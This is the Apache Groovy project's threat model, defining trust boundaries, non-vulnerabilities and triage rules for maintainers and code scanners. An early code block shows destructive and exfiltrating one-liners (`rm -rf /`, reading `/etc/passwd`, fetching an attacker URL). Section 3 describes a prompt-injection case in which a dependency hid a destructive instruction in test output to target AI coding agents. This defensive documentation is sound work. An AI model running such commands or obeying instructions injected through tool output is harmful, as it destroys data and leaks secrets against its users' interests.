<!--
  Licensed to the Apache Software Foundation (ASF) under one
  or more contributor license agreements.  See the NOTICE file
  distributed with this work for additional information
  regarding copyright ownership.  The ASF licenses this file
  to you under the Apache License, Version 2.0 (the
  "License"); you may not use this file except in compliance
  with the License.  You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing,
  software distributed under the License is distributed on an
  "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
  KIND, either express or implied.  See the License for the
  specific language governing permissions and limitations
  under the License.
-->

# Apache Groovy — Threat Model

**Applies to:** Groovy 3.0.x, 4.0.x, 5.0.x
(and 6.0.x alpha) as covered by [`SECURITY.md`](.github/SECURITY.md).

This document states what Apache Groovy treats as a security
vulnerability and what it does not. Its primary audience is twofold:
maintainers triaging reports, and **automated code-scanning tools (and
the people reading their output)**. Groovy's nature as a language makes
it a magnet for pattern-based "findings" that are, by design, not
vulnerabilities; this document exists so those can be classified quickly
and consistently instead of one-by-one.

Each non-trivial claim carries a provenance tag:
*(documented)* — backed by shipped docs, javadoc, or source verified in
this repository; *(inferred)* — a reasoned position not yet confirmed by
the PMC; *(maintainer)* — confirmed by the PMC through its approval of this
document.

---

## 1. The one thing to understand first

**Groovy is a general-purpose programming and scripting language for the
JVM. Compiling and running the code it is given is the entire product —
not a vulnerability.** *(maintainer)*

A Groovy program can read any file the JVM can read, open network
connections, spawn processes, and call any Java API. All of the
following are valid, working, *intended* Groovy:

```groovy
"rm -rf /".execute()                          // run a shell command
new File('/etc/passwd').text                  // read a local file
new URL(attacker).bytes                        // exfiltrate over the network
Eval.me(scriptText)                            // evaluate an expression
```

One person's "dangerous capability" is another person's reason for
reaching for a scripting language in the first place. The power to do
these things on demand is the feature. Consequently:

> The trust boundary is the **source code, scripts, templates, and
> objects that the embedding application chooses to compile, evaluate,
> or deserialize.** Everything on the language's side of that boundary
> runs with the full authority of the host JVM, by design.

Groovy is **not a sandbox** and does not claim to be one. The project's
position — long stated on the [security page](https://groovy-lang.org/security.html)
and in mailing-list guidance — is: **do not compile, evaluate, or
deserialize untrusted input.** When you embed something as powerful as
Groovy, securing *how you use it* is your responsibility, and that
requires auditing your own integration, not expecting the language to
refuse to do what it is asked. *(documented)*

Groovy does ship a handful of narrow conveniences that reduce risk for
specific, common data-handling cases (parameterized SQL, hardened XML
parsing, data-only JSON parsing — see [§8](#8-security-properties-the-project-provides)).
These are *helpers within* the trust-the-code design, not a perimeter
around it.

---

## 2. Scope and intended use

Groovy is consumed as a **library, runtime, and command-line toolchain**,
not deployed as a network service of its own. The shapes that matter:

| Use shape | Description |
|---|---|
| **Embedded runtime** | An application puts `groovy-*` jars on its classpath and calls Groovy APIs (GDK methods, `groovy.sql.Sql`, parsers, builders) and/or evaluates Groovy it authored. |
| **Dynamic evaluation host** | An application uses `GroovyShell`, `Eval`, `GroovyClassLoader`, `GroovyScriptEngine`, JSR-223 (`groovy-jsr223`), or the template engines to run Groovy decided at runtime. |
| **Build / compile** | `groovyc`, the Gradle/Maven integrations, and AST transforms compile developer-authored source. |
| **Interactive / CLI tools** | `groovy`, `groovysh`, `groovyConsole`, `groovydoc`, `groovy-servlet` run on inputs the operator provides. |

### Caller roles

| Role | Trust level | What they control |
|---|---|---|
| **Application developer / embedder** | **Fully trusted** | The Groovy source, scripts, templates, classpath, AST transforms, extension modules, and system properties. Their code runs with full JVM authority — by design. |
| **Build / CI operator** | **Fully trusted** | What gets compiled and the build environment. |
| **CLI / interactive user** | **Trusted, local** | Runs the tools on their own machine with their own privileges on files they supply. |
| **End user of an application built with Groovy** | **Untrusted** | Supplies **data** to that application. Whether they can also supply *code* depends entirely on choices the developer made — and that choice, not Groovy, owns the consequence. |

The security-relevant question is almost always: *did the developer feed
this actor's input to something that treats it as code (or as a
serialized object graph), or only to something that treats it as data?*
The first is out of model; the second is where Groovy's obligations live.

---

## 3. Out of scope (explicit non-goals)

Findings whose mechanism is any of the following are, **by default, not
treated as vulnerabilities in Groovy**, and their expected disposition is
out-of-model ([§13](#13-triage-dispositions)). "By default" is deliberate:
each report is still assessed before it is closed. We are looking
specifically for *surprising* behavior — a case where a developer following
Groovy's documented secure practices would nonetheless be caught out. That
assessment can promote any item below to `VALID` (rarely, a CVE), to
`VALID-HARDENING`, or to `MODEL-GAP`. This section rules out the *default
obligation*, not the act of looking — so when in doubt, still report it.

- **Executing supplied source, scripts, or templates.** Anything that
  relies on the application passing attacker-influenced text to
  `Eval`, `GroovyShell.evaluate`, `GroovyClassLoader.parseClass`,
  `GroovyScriptEngine`, JSR-223 `eval`, or a template engine. Templates
  *are* code; rendering an attacker-controlled template is RCE by
  construction. This covers *compiling, parsing, or statically analyzing*
  such text, not only running it: Groovy executes compile-time
  metaprogramming — global AST transforms on the compile classpath,
  `@ASTTest`, and static initializers — during `groovyc`, JSR-223
  compilation, and even IDE indexing, so merely compiling attacker-
  controlled Groovy is code execution, exactly as evaluating it is.
  *(documented)*
- **Groovlets and template servlets** (`groovy-servlet`: `GroovyServlet`,
  `TemplateServlet`). These run `.groovy` scripts / templates that the
  operator *deploys* into the web application (via `GroovyScriptEngine`) —
  developer-deployed code execution, trusted by definition. HTTP request
  data handed to a Groovlet as bindings *is* untrusted, and handling it
  safely is the Groovlet author's downstream responsibility
  ([§10](#10-downstream-responsibilities)), exactly as for any web handler.
  An operator who lets attacker-uploaded `.groovy` files reach the served
  path has enabled untrusted code execution — operator misconfiguration, not
  a Groovy vulnerability. *(documented — verified in `groovy-servlet`)*
- **Deserializing untrusted data.** Java serialization of attacker-
  controlled bytes is unsafe by the JDK's own statements. Groovy types
  are `Serializable` for legitimate reasons, and gadget chains or
  resource-exhaustion built from a crafted object graph require the
  application to call `ObjectInputStream.readObject` on untrusted bytes —
  which is already game over regardless of Groovy. See
  [§11](#11-known-misuse-patterns); [§11c](#11c-serialization-hardening--capability-vs-data)
  gives the capability-vs-data rule for dispositioning serialization findings.
  *(maintainer)*
- **Absence of a sandbox.** Groovy provides no isolation of executed code
  from the JVM or host. Reports amounting to "Groovy code can touch the
  filesystem/network/processes" are out of model.
- **No new authority (equivalent-harm).** A finding that reaches an effect
  the actor could *already* reach by a legitimate, intended path grants no
  new authority and is out of model. If a script author can already run
  arbitrary JVM code, a *novel* route to code execution — via the
  metaclass, a category, `invokeMethod`, runtime class generation, an AST
  transform, or any other MOP mechanism — is not a privilege escalation; it
  is the same authority by another name. The in-model question is always
  *"does this give an actor something the model did not already grant
  them?"*, not *"is there another way to do X?"*.
- **Bypasses of `SecureASTCustomizer`** (and similar AST filtering). It is
  a best-effort grammar lockdown, explicitly *not* a complete security
  solution (see [§9](#9-security-properties-the-project-does-not-provide)).
  Demonstrating a bypass is expected, not a vulnerability. The underlying
  fact — that it is not a security boundary — is *(documented)* by its own
  javadoc ([§9](#9-security-properties-the-project-does-not-provide)), and
  treating a bypass *report* as `BY-DESIGN` rather than `VALID` is the
  project's triage stance. *(maintainer)*
- **`@Grab` / Grape dependency resolution.** Resolving and loading
  dependencies a script *declares* is the feature. Pulling a malicious
  artifact because the script (or its resolver config) said to is
  developer/operator responsibility.
- **Trusted-input surfaces.** The classpath, global AST transforms,
  extension modules, `CompilerConfiguration`, system properties
  (`groovy.*`), and `~/.groovy` are developer/operator-controlled. An
  attacker who can alter them already has code execution.
- **Vulnerabilities in dependencies or the JDK** (JAXP providers, JDBC
  drivers, Ivy/Maven resolvers, logging backends). Report those upstream;
  Groovy tracks and bumps where it can. Note that a CVE in a dependency
  does not automatically mean Groovy is affected: the vulnerability is
  frequently in a part of the library Groovy does not use or exercise, so
  there is no reachable path to it. Groovy monitors all such cases
  carefully, assessing reachability before acting, and will bump, document
  the non-impact, or relocate/remove the dependency as appropriate.
- **Prompt injection aimed at AI agents via tool output.** A dependency —
  or any processor in the build/test chain — can emit text designed to be
  read as *instructions* by an AI coding agent that consumes build,
  compiler, or test output (the technique seen in a 2026 property-testing-
  library release, where a destructive instruction was printed to test
  stdout and hidden from interactive terminals with ANSI escape codes while
  remaining in captured output). This is a supply-chain and agent-toolchain
  concern, **not a Groovy vulnerability**: it does not exploit Groovy's
  runtime, and Groovy emits its own output faithfully ([§10](#10-downstream-responsibilities),
  item 9) rather than sanitizing it for whatever downstream interpreter — a
  shell, a browser, a SQL engine, or now an LLM — happens to consume it. The
  defenses are dependency pinning and the SBOM ([§5](#5-assumptions-about-the-environment))
  against a surprise version, plus the *data-never-instruction* and
  *confirm-state-changing-actions* rules in [`AGENTS.md`](AGENTS.md) for the
  agent reading the output.
- **Misuse by the embedding application** — SQL/command strings built by
  hand from untrusted input, etc. Covered as *downstream responsibility*
  in [§10](#10-downstream-responsibilities).

---

## 4. Trust boundaries and data flow

The decisive boundary is **data vs. code/objects**:

```
  Untrusted actor's input
          │
          ├──► treated as DATA ────────────────────────────► IN MODEL
          │      JsonSlurper / XmlSlurper / XmlParser /         (Groovy must not
          │      YAML/TOML/CSV parsers, groovy.sql.Sql           silently turn
          │      bind parameters, GDK string/collection ops      this data into
          │                                                       code, types, or
          │                                                       info disclosure
          │                                                       beyond the format)
          │
          └──► treated as CODE or a SERIALIZED OBJECT ───────► OUT OF MODEL
                 GroovyShell / Eval / GroovyClassLoader /         (the application
                 GroovyScriptEngine / JSR-223 / template          made the security
                 engines / ObjectInputStream.readObject           decision; full JVM
                                                                   authority follows)
```

The highest-value review surface is therefore the **data parsers**: code
that is *meant* to consume untrusted bytes. A defect there (a parser that
instantiates arbitrary types, an XML stack that resolves external
entities by default, a temp artifact written world-readable) crosses the
boundary in a way the developer could not reasonably anticipate, and *is*
in model.

**What a real Groovy-side injection bug looks like.** The mirror of the
"templates are code" rule ([§3](#3-out-of-scope-explicit-non-goals))
defines the *in-scope* case precisely: Groovy is at fault when **a
Groovy-shipped component itself routes untrusted data into an evaluator the
developer never asked to invoke** — for example, if a GDK method, builder,
or parser took a value the developer passed purely as *data* and silently
compiled or evaluated it as a `GString`/expression/script. That would be a
genuine server-side template / expression injection *in Groovy*. It is the
opposite of, and must not be
conflated with, the developer *choosing* to call `Eval`/`GroovyShell`/a
template engine on untrusted input, which is out of model. A scanner should
hunt for the former and discount the latter.

---

## 5. Assumptions about the environment

- The JVM hosting Groovy is itself trusted and adequately patched; Groovy
  inherits the JDK's security posture (and its removal of the
  `SecurityManager` — see [§9](#9-security-properties-the-project-does-not-provide)). *(documented)*
- Groovy inherits the JVM's memory safety. Memory-corruption classes —
  buffer overflow, use-after-free, native type confusion — are outside
  this model; such a defect would be a JDK/JVM bug, not a Groovy one. This
  is the managed-runtime counterpart to the soundness/`unsafe` concerns
  that dominate native-language threat models. *(documented)*
- The Groovy artifacts being run are authentic. Official releases are
  GPG-signed and checksummed per the ASF release process; Groovy's own
  build pins its dependencies with Gradle dependency verification
  (`gradle/verification-metadata.xml` — checksums plus a PGP keyring) and
  publishes a CycloneDX SBOM per module, so what ships can be
  provenance-checked. Substituting a tampered Groovy jar is a supply-chain
  compromise of the operator's environment — out of model here, like an
  untrusted classpath. *(documented)*
- The classpath, `CompilerConfiguration`, registered AST transforms,
  extension modules, and `groovy.*` system properties reflect the
  developer's/operator's intent, not an attacker's. *(inferred)*
- For CLI tools, the user runs them with their own privileges on files
  they chose; the tools are not a privilege boundary between users on the
  host. *(inferred)*
- Where Groovy writes to the filesystem (compiled stubs, generated Java
  source, temp dirs), it does so on a host where the OS temp directory is
  not itself adversarial beyond what owner-only permissions defend
  against. *(documented — see P4 in [§8](#8-security-properties-the-project-provides))*

### 5a. Build-time / configuration knobs that affect this model

| Knob | Default | Security effect |
|---|---|---|
| `XmlParser` / `XmlSlurper` / `XmlUtil` `allowDocTypeDeclaration` | `false` | When `false`, DOCTYPE is rejected and secure processing is on → XXE / entity-expansion mitigated. Setting `true` re-introduces XXE risk for untrusted XML. *(documented)* |
| `groovy.json.maxNestingDepth` (per-instance: `JsonSlurper.setMaxNestingDepth`) | `1000` | Caps the array/object nesting depth `JsonSlurper`/`JsonSlurperClassic` accept; a small but deeply-nested document throws a `JsonException` instead of driving a `StackOverflowError`. A value `<= 0` disables the check (restoring the previous unbounded behaviour). Available from 6.0.0. *(documented — verified in `groovy-json` `BaseJsonParser`)* |
| Grape / `@Grab` resolution | enabled in the runtime; **off** in AI/automation tooling via `-Dgroovy.grape.enable=false` | Controls whether a script may fetch and load remote dependencies. Keep off for untrusted scripts. *(documented — see [`AGENTS.md`](AGENTS.md))* |
| `SecureASTCustomizer` allow/deny lists | none unless configured | A *partial* grammar restriction, not a sandbox. *(documented)* |
| `groovy.antlr4.cache.threshold` and similar | tuning | Resource tuning, not a security boundary. |

---

## 6. Assumptions about inputs

| Input | Trust | Notes |
|---|---|---|
| Groovy source / scripts / templates compiled or evaluated by the app | **trusted by definition** | If it isn't, the app has already chosen to run untrusted code — out of model. |
| Serialized object bytes passed to `ObjectInputStream` | **must be trusted** | Out of model if not; see [§11](#11-known-misuse-patterns). |
| JSON / XML / YAML / TOML / CSV documents | **may be untrusted** | These are the parsers whose job is to consume untrusted bytes safely → **in model**. |
| Values bound into `groovy.sql.Sql` GString queries | **may be untrusted** | Bound as JDBC parameters by default → **in model** (P1). |
| Classpath, AST transforms, extension modules, `groovy.*` properties, `~/.groovy` | **trusted** | Operator-controlled configuration. |
| CLI arguments / files given to `groovy`, `groovyc`, `groovysh`, etc. | **trusted** | Supplied by the local user. |

Size/shape: parsers and GDK operations process inputs of developer-chosen
size. Groovy does **not** impose universal limits on collection size, regex
backtracking, hash-key cardinality, or numeric magnitude; bounding untrusted
input is a downstream responsibility ([§10](#10-downstream-responsibilities)).
The one exception is **document nesting depth in `JsonSlurper`**, now capped
by default (see the parser table below) — the rest still need bounding by the
caller.

**Groovy's own data parsers are a distinct concern.** `JsonSlurper`,
`XmlSlurper`/`XmlParser`, and the `groovy-yaml`/`groovy-toml`/`groovy-csv`
parsers are advertised to consume *untrusted* documents (P3 records the
verified data-only guarantee for JSON and the YAML/TOML/CSV slurpers). When
one of these can be driven to a `StackOverflowError`, unbounded allocation,
or non-linear blow-up by a *small* crafted document, that is a robustness
failure in code whose job is to be safe on untrusted input — closer to
in-model than the general "bound your inputs" guidance above. **Such reports
are `VALID-HARDENING`** (not `OUT-OF-MODEL: downstream-responsibility`).
*(maintainer)*

All of Groovy's own data parsers now bound nesting depth by default:

| Parser | Resource-bound state |
|---|---|
| `XmlSlurper` / `XmlParser` | Mitigated by default — `FEATURE_SECURE_PROCESSING` + DOCTYPE disabled (**P2**) cap entity expansion and depth via the JAXP limits. |
| `YamlSlurper` / `TomlSlurper` / `CsvSlurper` | Bounded *implicitly* by the Jackson runtime's `StreamReadConstraints` (nesting-depth / length caps) and the YAML layer's alias limits — i.e. by the dependency's defaults, not an explicit Groovy decision. |
| `JsonSlurper` | **Now bounded explicitly (6.0.0+).** Its recursive-descent parsers (`decodeValue` → `decodeJsonObject`/`decodeJsonArray` → `decodeValue`) enforce a Groovy-level nesting-depth cap (`BaseJsonParser`, default `1000`, configurable via `setMaxNestingDepth` or `-Dgroovy.json.maxNestingDepth`), throwing a `JsonException` rather than overflowing the stack. The default matches Jackson's `StreamReadConstraints`, so JSON is now bounded consistently with the Jackson-backed slurpers. *(documented — GROOVY-12064)* |

This is separate from the Groovy *language* parser (`groovyc`/Antlr), which
only ever parses trusted source — compiling untrusted Groovy is already out
of model ([§3](#3-out-of-scope-explicit-non-goals)) — so its robustness
carries no equivalent obligation. The `JsonSlurper` nesting cap (GROOVY-12064)
closed the last gap here for the 6.0.0 line; on the 3.0.x/4.0.x/5.0.x branches,
where it is not (yet) available, depth-bounding untrusted JSON remains a
downstream responsibility ([§10](#10-downstream-responsibilities)).

---

## 7. Adversary model

Because Groovy is a library/toolchain rather than a service, there is no
single "remote attacker." The adversaries that matter:

**In scope**

- **A data supplier to an embedding application.** Can submit
  JSON/XML/YAML/TOML/CSV documents, SQL parameter values, or strings that
  the application routes to Groovy **as data**. Goal: make Groovy exceed
  the data contract — execute code, instantiate unexpected types, resolve
  external entities, disclose host information, or consume resources
  disproportionately — *without* the developer having opted into code
  evaluation. Cannot change the application's classpath, config, or
  source.
- **A local user on a shared host.** Can read predictable or
  world-readable artifacts that Groovy tooling writes (the class of issue
  behind CVE-2020-17521).

**Capabilities the in-scope adversary has (closed list).** Supplying bytes
to a data parser; supplying values bound as data (SQL parameters, template
*bindings* — not template *text*); supplying oversized, deeply-nested, or
syntactically adversarial *data*; and, for the local adversary, reading
files on the shared host subject to OS permissions. **A finding that
requires any capability not on this list is out of model**
([§11b](#11b-scanner-calibration-default-downgrade-rules)).

**Out of scope — explicitly, the adversary cannot be assumed to:**

- supply code, scripts, templates, or serialized objects the application
  evaluates/deserializes (see [§3](#3-out-of-scope-explicit-non-goals));
- alter the classpath, AST transforms, extension modules, Grape config,
  `CompilerConfiguration`, or `groovy.*` properties (developer/operator
  privilege);
- replace or tamper with the Groovy artifacts themselves (supply-chain
  compromise of the host — see [§5](#5-assumptions-about-the-environment));
- attack the JVM/JDK or third-party dependencies rather than Groovy itself.

---

## 8. Security properties the project provides

These are deliberately *narrow* conveniences for common data-handling
cases. Each has a CWE, an indicative severity if violated (a rough CVSS
band to help a scan prioritise, not a committed score), the condition under
which it holds, and what its violation would look like.

- **P1 — Parameterized SQL for the GString form.** `groovy.sql.Sql`
  converts `${...}` placeholders in its GString query forms into JDBC
  `PreparedStatement` bind parameters rather than string concatenation, so
  the idiomatic `sql.rows("select * from p where name = $name")` is
  parameterized. *Condition:* the GString/bind APIs are used (not a
  hand-concatenated `String`). *Violation:* a GString placeholder reaching
  the driver as literal SQL. CWE-89. *Indicative severity if violated:
  High.* *(documented — verified in `groovy-sql`)*
- **P2 — Hardened XML parsing by default.** `XmlParser`, `XmlSlurper`,
  `XmlUtil`, and the DOM/SAX/StAX/Transformer factories created via
  `groovy.xml.FactorySupport` enable `FEATURE_SECURE_PROCESSING`, disable
  external entity resolution, and **disallow DOCTYPE declarations by
  default**, mitigating XXE and entity-expansion ("billion laughs").
  *Condition:* `allowDocTypeDeclaration` left at its default `false`.
  *Violation:* default-configured parsing resolving an external entity or
  expanding a DTD bomb. CWE-611 / CWE-776. *Indicative severity if violated:
  High.* *(documented — verified in `groovy-xml/FactorySupport.java`)*
- **P3 — Data-only structured-data parsing.** Groovy's structured-data
  slurpers map an untrusted document to plain `Map`/`List`/`String`/
  `Number`/`Boolean`/`null` values; none has a polymorphic/default-typing
  mode that instantiates document-named classes, so parsing untrusted input
  does not itself construct gadget types. Verified for `JsonSlurper` (all
  four `JsonParserType` variants — `CHAR_BUFFER`, `INDEX_OVERLAY`,
  `CHARACTER_SOURCE`, `LAX` — return only such values; the variant changes
  only the parsing strategy) and for the untyped `parse(...)` paths of
  `YamlSlurper`, `TomlSlurper`, and `CsvSlurper`, which read via Jackson into
  untyped `Object`/`Map`/`List`. The YAML path notably uses Jackson's
  untyped binding (`YamlConverter`), **not** SnakeYAML's `Yaml.load()`, so
  YAML `!!`-tag type instantiation — the classic SnakeYAML RCE vector — is
  not reachable. The explicit `parseAs(Class<T>, …)` overloads bind to a
  **caller-supplied** type with no Jackson default typing enabled, so any
  instantiation is caller-controlled, not document-controlled. *Condition:*
  default typing not enabled; for the typed overloads, the caller chose the
  target type. *Violation:* a document causing instantiation of a class it
  names. CWE-502. *Indicative severity if violated: Critical.* *Scope:* a
  type-safety guarantee, not a resource-exhaustion one — DoS robustness of
  these parsers is addressed separately and is now bounded by default for all
  of them, including a `JsonSlurper` nesting-depth cap from 6.0.0
  ([§6](#6-assumptions-about-inputs)); `TomlSlurper`/`CsvSlurper`
  are `@Incubating` (best-effort per the stability qualifier below).
  *(documented — verified in `groovy-json`, `groovy-yaml` `YamlConverter`,
  `groovy-toml`, `groovy-csv`)*
- **P4 — Owner-only temporary artifacts.** Temp directories created by
  Groovy tooling (e.g. `FileSystemCompiler` joint-compilation staging) use
  NIO `Files.createTempDirectory`, yielding owner-only permissions — the
  fix class for CVE-2020-17521. *Violation:* a Groovy-created temp
  artifact being world-readable/writable. CWE-377 / CWE-378. *Indicative
  severity if violated: Medium (local).* *(documented — verified in
  `DefaultGroovyStaticMethods`/`FileSystemCompiler`)*
- **P5 — Coordinated security maintenance.** Supported branches receive
  security fixes and coordinated disclosure per [`SECURITY.md`](.github/SECURITY.md)
  and the [security history](https://groovy-lang.org/security.html). *(documented)*

A report demonstrating a *default-configuration* violation of P1–P4 is a
genuine vulnerability and should be reported privately
([§13: VALID](#13-triage-dispositions)).

**Stability qualifier — `@Incubating` APIs and pre-release builds.** A
genuine, in-model vulnerability does not stop being one because it lives in
surface we have explicitly marked unstable. Reports against `@Incubating`
APIs, or against alpha/beta/pre-release builds, are still assessed, can
still be `VALID`, and can still warrant a CVE — we do not wash our hands of
them. What is reduced is *priority and urgency*, not whether we act:
because that surface is published so that users do **not** yet rely on it
in production, such issues are fixed on a **best-effort, reduced-priority**
basis, are not embargoed-urgent, and might be handled in the open in some
cases. This extends the pre-release footnote in [`SECURITY.md`](.github/SECURITY.md)
(the `(**)` note) to `@Incubating` API surface in otherwise-stable
releases. The reduction applies only while the affected surface is
unstable: a vulnerability that **also** reaches stable, non-incubating
surface in a supported release is handled at that surface's normal
priority.

---

## 9. Security properties the project does NOT provide

Groovy does **not** claim, and you must not assume, any of the following.

- **A sandbox / isolation of executed code.** Evaluated Groovy has full
  JVM authority. There is no built-in mechanism that confines it.
- **Protection against malicious source, scripts, templates, or serialized
  objects.** See [§3](#3-out-of-scope-explicit-non-goals).
- **`SecurityManager`-based confinement.** The JDK `SecurityManager` is
  deprecated/removed; Groovy does not rely on it and neither can you.

### False friends — features that look like security but are not

| Feature | What it actually is | Why it is **not** a security boundary |
|---|---|---|
| `SecureASTCustomizer` | A grammar/AST allow-or-deny filter applied at compile time | Its own javadoc states it "by itself isn't intended to be the complete solution of all security issues when running scripts on the JVM." Bypassable; one layer among many, not a perimeter. *(documented)* |
| `@ThreadInterrupt` / `@TimedInterrupt` / `@ConditionInterrupt` | Cooperative interruption checks woven into loops/methods to tame *runaway* (buggy) scripts | Cooperative and removable by the code being run; no defense against deliberately malicious scripts. |
| `@CompileStatic` / `@TypeChecked` | Compile-time type checking for correctness and performance | Not a security control; statically-compiled code is exactly as privileged. |
| `groovy.sql.Sql` (beyond P1) | Convenience SQL access | Only the GString/bind forms parameterize. A `String` you concatenate yourself, or dynamic identifiers via `Sql.expand`, are **not** protected (CWE-89). |
| The Groovy "shell"/console tools | Developer/operator conveniences | `groovysh`/`groovyConsole` run code with the user's full privileges; they are not multi-tenant or sandboxed. |

Well-known attack classes Groovy does **not** defend against on the
application's behalf: command injection from app-built command strings
(and *option injection* from untrusted values placed into an otherwise-safe
argument vector), SSRF from app-built URLs, path traversal from app-built
paths, ReDoS from app-chosen patterns/inputs, algorithmic-complexity
("hash-flooding") DoS from untrusted map keys, and resource exhaustion from
unbounded untrusted input. These are downstream responsibilities ([§10](#10-downstream-responsibilities)).

---

## 10. Downstream responsibilities

If you embed or script with Groovy, **you** own these:

1. **Do not compile, evaluate, or deserialize untrusted input.** Treat
   scripts, templates, and serialized object graphs as code.
2. **If you must run partially-trusted scripts, layer real isolation**
   outside the language: a separate process/JVM, an OS/container sandbox
   (seccomp, namespaces), least-privilege credentials, and network-egress
   controls. Treat `SecureASTCustomizer` as *one* hardening layer, never
   the boundary.
3. **Use parameterized queries** (P1) — never hand-concatenate untrusted
   values into SQL/HQL/JPQL.
4. **Never build shell commands or `Process` invocations from untrusted
   input** for `String.execute()` / `ProcessGroovyMethods`. Even the safer
   `String[]`/`List` argument form is not immune to *option injection* — an
   untrusted value passed as its own argument (e.g. one starting with
   `-`/`--`) can be read by the target program as a flag; validate such
   values or use a `--` end-of-options separator.
5. **Keep `@Grab`/Grape off when processing untrusted scripts**, and keep
   the resolver configuration and classpath trusted.
6. **Bound untrusted input** — document depth, collection/array size,
   regex complexity, numeric magnitude — before handing it to parsers or
   GDK operations.
7. **For XML, keep `allowDocTypeDeclaration = false`** for untrusted
   documents (P2). Only enable DOCTYPE/external resources for content you
   trust.
8. **Keep the classpath, AST transforms, and extension modules trusted** —
   compiling source executes whatever transforms are on the classpath.
9. **Validate/encode at your own boundaries** (output encoding, URL
   allow-lists, path canonicalization) — Groovy returns data faithfully,
   it does not sanitize it for your sink. The "sink" includes an **AI agent**
   that reads program, build, or test output: faithfully-reproduced
   untrusted text can carry instructions aimed at such an agent (prompt
   injection), so a consumer that feeds this output to an LLM must treat it
   as data, never as instructions (see [`AGENTS.md`](AGENTS.md)).
10. **Stay on a supported version** ([`SECURITY.md`](.github/SECURITY.md)).

---

## 11. Known misuse patterns

Common ways applications create vulnerabilities *with* Groovy (the
vulnerability is in the integration, not the language):

- Passing untrusted input to `Eval.me`, `GroovyShell.evaluate`,
  `GroovyClassLoader.parseClass`, `GroovyScriptEngine`, or JSR-223 `eval`.
- Rendering an **attacker-controlled template** with `SimpleTemplateEngine`,
  `GStringTemplateEngine`, `StreamingTemplateEngine`, `MarkupTemplateEngine`,
  or `XmlTemplateEngine` — templates compile to Groovy, so this is RCE.
- Calling `ObjectInputStream.readObject` on untrusted bytes that may
  contain Groovy types. A crafted object graph can drive resource
  exhaustion (or, historically, code execution via gadget chains), but
  every such case requires the application to deserialize attacker-
  controlled bytes — *"where do you accept user-supplied serialized data
  these days?"* The project's stance: this is **out of model** as a
  vulnerability (you must not deserialize untrusted data), while
  defense-in-depth hardening of serializable runtime types is a reasonable
  *VALID-HARDENING* improvement to pursue in the open. *(maintainer)*
- Hand-concatenating untrusted values into a SQL `String` instead of using
  the GString/bind forms (P1).
- Building a command line from untrusted input and calling `.execute()`.
- Relying on `SecureASTCustomizer` or `@ThreadInterrupt` as if it were a
  sandbox.
- Enabling `@Grab` resolution while running untrusted scripts.
- Parsing untrusted XML after setting `allowDocTypeDeclaration = true`.

### 11a. Known non-findings (recurring false positives)

A scanner sweeping a *language implementation* will flag the language's
own machinery. These match-by-pattern items are **expected and not
vulnerabilities** unless a concrete, in-model data-boundary crossing
([§4](#4-trust-boundaries-and-data-flow)) is shown:

| Pattern in Groovy's own source | Disposition |
|---|---|
| `GroovyClassLoader` / `parseClass` / `defineClass` / bytecode generation | The compiler doing its job — `KNOWN-NON-FINDING` |
| Reflection, `MetaClass`, `invokeMethod`/`getProperty`/`setProperty`/`methodMissing`, `MethodHandle`/`invokedynamic` | Core Meta-Object Protocol — `KNOWN-NON-FINDING` |
| `ProcessGroovyMethods`, `String.execute()`, `Runtime.exec` wrappers | Intended GDK API; injection requires app-supplied untrusted input — `OUT-OF-MODEL: downstream-responsibility` |
| Runtime types (e.g. `Closure` and friends) implementing `Serializable`, `readObject`/`readResolve` | `OUT-OF-MODEL: untrusted-deserialization` — but apply the capability-vs-data test in [§11c](#11c-serialization-hardening--capability-vs-data): capability primitives are `VALID-HARDENING`, arbitrary-graph DoS stays out of model |
| `ObjectInputStream` use in Groovy's own helpers | `OUT-OF-MODEL: untrusted-deserialization` |
| AST transforms executing code at **compile** time (local & global) | By design; compile time is trusted — `KNOWN-NON-FINDING` |
| `Eval` / `GroovyShell` inside Groovy's tools, tests, and `groovysh`/`groovyConsole` | By design — `BY-DESIGN: property-disclaimed` |
| `@Grab`/Grape fetching and loading artifacts | By design dependency resolution — `OUT-OF-MODEL` |
| Temp-file/dir creation | Now NIO owner-only (P4) — `KNOWN-NON-FINDING` |
| Regex, `BigInteger`/`BigDecimal` parsing, hash-collision flooding (JDK treeifies heavily-collided `String`-keyed buckets since Java 8) | DoS bounded by developer-chosen input — `OUT-OF-MODEL: downstream-responsibility` |
| Deep recursion / unbounded input in Groovy's *own* data parsers (`JsonSlurper`, `XmlSlurper`/`XmlParser`, `groovy-yaml`/`-toml`/`-csv`) | Robustness of code meant to consume untrusted input — **`VALID-HARDENING`** *(maintainer)*; nesting depth is now bounded by default in all of them (JSON via the 6.0.0 `maxNestingDepth` cap, GROOVY-12064), per-parser exposure in [§6](#6-assumptions-about-inputs) |
| Dynamic proxy / runtime class generation (`Proxy`, `ProxyGenerator`) | Core runtime mechanism — `KNOWN-NON-FINDING` |
| `SecureASTCustomizer` bypass demonstrations | `BY-DESIGN: property-disclaimed` (it is not a sandbox) |
| Groovy tool/compiler/test output echoing attacker-controlled text (identifiers in errors, values in results), or a dependency emitting agent-targeted text | Faithful output, not sanitized for a downstream sink (shell / browser / SQL / **LLM agent**); the consumer treats it as data — `OUT-OF-MODEL: downstream-responsibility` (see [§3](#3-out-of-scope-explicit-non-goals), [`AGENTS.md`](AGENTS.md)) |

### 11b. Scanner calibration (default-downgrade rules)

Instructions for an automated scanner or first-pass triager: a candidate
finding is **downgraded to out-of-model by default** — surfaced only if it
*also* clears the bar in the right-hand column — when its mechanism depends
on any of the following.

| Downgrade by default when the finding depends on… | …unless it *also* shows |
|---|---|
| the application **evaluating or compiling supplied code/templates** ([§3](#3-out-of-scope-explicit-non-goals)) | a Groovy component itself feeding untrusted *data* to an evaluator unrequested ([§4](#4-trust-boundaries-and-data-flow)) |
| the application **deserializing untrusted bytes** ([§3](#3-out-of-scope-explicit-non-goals)) | a default-config violation of a [§8](#8-security-properties-the-project-provides) property |
| **equivalent-harm** — a new path to authority the actor already holds ([§3](#3-out-of-scope-explicit-non-goals)) | the path crosses a trust boundary the actor did *not* already hold |
| **malformed-input / DoS** against developer-chosen input ([§6](#6-assumptions-about-inputs)) | the target is one of Groovy's *own* untrusted-input parsers (`VALID-HARDENING`, [§6](#6-assumptions-about-inputs)) |
| a **malicious dependency, classpath, or `groovy.*` property** ([§3](#3-out-of-scope-explicit-non-goals)) | reachability through Groovy's own default-configured code |
